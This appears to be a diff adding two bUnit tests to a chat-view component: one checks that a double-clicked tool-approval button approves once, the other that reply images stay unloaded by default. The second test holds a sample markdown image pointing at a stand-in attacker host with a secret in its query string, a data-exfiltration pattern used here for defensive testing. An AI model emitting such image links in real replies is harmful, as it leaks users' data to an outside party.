@@ -110,6 +110,41 @@ public class ChatViewTests : BunitContext
         view.WaitForAssertion(() => Assert.Empty(view.FindAll(".pch-approval")));
     }
 
+    [Fact(DisplayName = "A double click on Approve, before the card redraws, approves once and does not fail")]
+    public void Approval_DoubleClick()
+    {
+        var conversation = new ChatConversation();
+        conversation.AddUserPrompt("Clean up");
+        var turn = conversation.BeginTurn();
+        turn.Apply(Update(new ToolApprovalRequestContent("r1", new FunctionCallContent("c1", "delete"))));
+        var view = HostDriven(conversation, showsActivity: true);
+        var approve = view.Find(".pch-approve");
+        var reject = view.Find(".pch-reject");
+
+        approve.Click();
+        approve.Click();
+        reject.Click();
+
+        Assert.Equal(ToolCallStatus.Running, conversation.Entries.OfType<ToolCallEntry>().Single().Status);
+    }
+
+    [Fact(DisplayName = "An image in a reply loads nothing by default, and loads when the application's options allow it")]
+    public void Reply_Images_OffByDefault()
+    {
+        var conversation = new ChatConversation();
+        conversation.AddUserPrompt("Hi");
+        var turn = conversation.BeginTurn();
+        turn.Apply(Update(new TextContent("![chart](https://evil.example/p?secret=42)")));
+        turn.Complete();
+
+        var view = HostDriven(conversation);
+        Assert.Empty(view.FindAll(".pch-reply img"));
+        Assert.Contains("chart", view.Find(".pch-reply").TextContent, StringComparison.Ordinal);
+
+        view.Render(parameters => parameters.Add(v => v.MarkdownOptions, new Polhem.Markdown.MarkdownOptions()));
+        Assert.Equal("https://evil.example/p?secret=42", view.Find(".pch-reply img").GetAttribute("src"));
+    }
+
     [Fact(DisplayName = "Rejecting a call that waits for approval rejects it")]
     public void Approval_Rejects()
     {
